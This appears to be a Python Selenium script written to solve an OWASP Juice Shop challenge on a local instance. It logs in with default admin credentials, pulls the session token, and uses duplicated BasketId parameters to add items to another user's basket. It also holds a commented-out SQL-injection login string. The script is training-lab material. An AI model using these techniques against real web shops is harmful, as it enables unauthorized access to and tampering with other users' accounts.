from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import requests
import json

# TODO: add routing to score-board to check each achievement after finishing


def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    # driver.get("https://juice-shop.herokuapp.com/#/") # used this originally and worked but debugging
    # driver.get("https://juice-shop.herokuapp.com")
    driver.get("http://localhost:3000/#/") 

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    # any user can be used to log in for this one
    login_user(driver)

    # print(driver.page_source)  
    # add_product_to_my_cart(driver)

    # Capture the authorization token after login then use it to make requests
    token = acquire_token(driver)

    # make sure token exists first...
    if token:
        print("Successfully acquired token.")
        # Now use the token to add a product to another user's basket
        basketid = acquire_basket_id(driver)

        other_basketid = "6"  # Use basket ID 6 for account username: ethereum@juice-sh.op    password: private

        if basketid and other_basketid:
            add_product_to_another_basket(token, basketid, other_basketid)
        
    else:
        print("Failed to capture the auth token.")

    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()

def login_user(driver):
    # login as normal user
    WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "navbarAccount"))
    ).click()

    # get to login page
    WebDriverWait(driver, 10).until (
        EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
    ).click()

    # Put in email & password
    emailField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "email"))
    )
    # emailField.send_keys("'or 1=1;--") #maybe juice-shop instead?
    emailField.send_keys("admin@juice-sh.op") #maybe juice-shop instead?

    passwordField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "password"))
    )
    # passwordField.send_keys("password123")
    passwordField.send_keys("admin123")
    passwordField.send_keys(Keys.RETURN) # This hits 'enter' while in password field meaning it logs in

    time.sleep(2) # allow login process to start

def add_product_to_my_cart(driver):
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "add-to-cart-button"))
    ).click()
    time.sleep(2)

def acquire_token(driver):
    
    cookies = driver.get_cookies()

    # print(f"Cookies: " + {cookies})

    for cookie in cookies:
        if cookie['name'] == 'token':
            return cookie['value']
    return None # TODO: Is this required?

# def acquire_basket_id(driver):
#     basketid = None

#     cookies = driver.get_cookies()
#     for cookie in cookies:
#         if 'basket' in cookie['name']:
#             basketid = cookie['value']
#             break
    
#     if not basketid:
#         print("BasketId could not be found in the cookies")  # will basketid be presented in cookies?

#     return basketid    

def acquire_basket_id(driver):
    # Retrieve the basketid from sessionStorage located in applications -> storage
    basket_id = driver.execute_script("return sessionStorage.getItem('bid');")
    
    if not basket_id:
        print("Basket ID could not be found in sessionStorage.")
    else:
        print(f"Basket ID found: {basket_id}")
    
    return basket_id


        

def add_product_to_another_basket(token, basketid, other_users_basketid):

    # url = "http://localhost:3000/api/BasketItems"
    # url = "https://juice-shop.herokuapp.com/api/BasketItems"
    url = "http://localhost:3000/api/BasketItems"    # !!! /api/BasketItems is how you send api calls for local 3000/#/BasketItems

    # basketAchievementCompletedAchievementURL = "http://localhost:3000/#/basket"  # Going to this URL completes the basket achievement after package sent


    # print(f"Sending token: {token}")
    
    headers = {
        "Authorization": f"Bearer {token}", # 'f' here allows for string literals
        "Content-Type": "application/json"
    }

    # Product is added to the other user's basket here
    payload = {
        "ProductId": 14,    # uses product ID of 14 as item to switch
        # "BasketId": basketid,      # Your basket ID gotten in main (might not need for payload actually...)
        "quantity": 5,

        # Sending both below returns successful response_code but achievement isn't set for other basket, just your own
        # "BasketId": basketid,
        # "BasketId": other_users_basketid  # Target basket ID
    }

    response = requests.post(url, json=payload, headers=headers, params={
        "BasketId": basketid,
        "BasketId": other_users_basketid
    })

    # TODO: Is the above payload breaking because the basketid isn't in quotes like on the doc??

    print("Sending reponse to json...")
    # response = requests.post(url, json=payload, headers=headers)

    # response = requests.post(url, json=payload, headers=headers, params={
    #     "BasketId": other_users_basketid
    # })

    print(f"Response code: {response.status_code} from AdditonalItemInBasket")

    responseid = 0
    
    if response.status_code == 200:

        try:
            response_json = response.json()  # Parse the response as JSON
            print("Response Body:", json.dumps(response_json, indent=4))

            responseid = response_json.get("data", {}).get("id")

            if responseid:
                print(f"Basket ID (id) extracted as responseid: {responseid}")
            else:
                print("ID not found in response.")

        except json.JSONDecodeError:
            print("Failed to decode response as JSON.")

        print("Product added to other user's basket!!!")

        print("Checking basket_contents...")

        verify_basket_content(other_users_basketid, token, responseid)


        # print(response.json_response)
    else:
        print(f"Error: {response.status_code}, {response.text}")
        print(f"IDs being sent {basketid} & {other_users_basketid}")

    # time.sleep(2)    

def verify_basket_content(basketid, token, apiIDNumber):
    # Make GET request to verify the content of the basket
    url = f"http://localhost:3000/api/BasketItems/{apiIDNumber}"

    print(f"Checking api URL at: {url}")

    headers = {
        "Authorization": f"Bearer {token}",  # Bearer token for authentication
    }

    # Send GET request to check the contents of the basket
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        try:
            basket_content = response.json()  # Parse the response as JSON
            print(f"Basket Content for Basket {basketid}:", json.dumps(basket_content, indent=4))
            
            # Now, handle the data correctly, check if the basket has the product
            data = basket_content.get('data', {})
            if data and data.get('ProductId') == 14:
                print("Product successfully added to the basket!")

                print("")

                print("In first response id is the request number, and in second response shows basketid based on request")
                print("number. This leads to basketId being null in the response, but due to it being a direction")
                print("contact at api/BasketItems/basketID, then this is just the response directly from the server.")

                print("")
                print("The response json indicates that the request was passed, successful, and added")
                print("the items to the users basket. This means it should complete the goal.")
                print("")

            else:
                print("Product not found in the basket.")
        except json.JSONDecodeError:
            print("Failed to decode basket content response as JSON.")
    else:
        print(f"Error: {response.status_code}, {response.text}")



# what is purpose of this it was in the adminLogIn.py but confused on what it does
# Adding here incase it is neccessary -- This actually runs the code very required
if __name__ == "__main__":
    main()